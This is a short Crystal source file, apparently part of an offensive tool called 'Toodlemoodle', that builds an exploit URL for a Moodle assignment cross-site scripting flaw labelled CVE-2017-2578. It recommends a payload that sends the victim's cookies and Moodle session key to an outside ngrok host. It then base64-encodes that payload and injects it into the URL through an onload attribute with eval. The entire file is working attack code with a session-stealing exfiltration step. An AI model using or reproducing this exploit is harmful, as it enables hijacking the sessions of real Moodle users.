# TODO: Write documentation for `Toodlemoodle`
require "http/client"
require "option_parser"
require "json"
require "base64"

module TMoodleActions
  class AssignmentXSS
    # CVE-2017-2578
    def perform(target)
      puts "Please enter an assignment URL e.g. http://localhost/mod/assign/view.php?id=2"
      assignment_url = gets().not_nil!
      puts "Please enter an XSS payload. It is recommended to follow this example, changing only the URL:\n\ndocument.body.appendChild(document.createElement('img')).src=('https://5fc418e2.ngrok.io/?session='.concat(document.cookie,'|',M.cfg.sesskey))"
      payload = gets().not_nil!
      puts "Crafted string prepared:"
      puts assignment_url + "&action=view\"onload=\"eval(window.atob('" + Base64.encode(payload).delete('\n') + "'))"
    end
  end
end
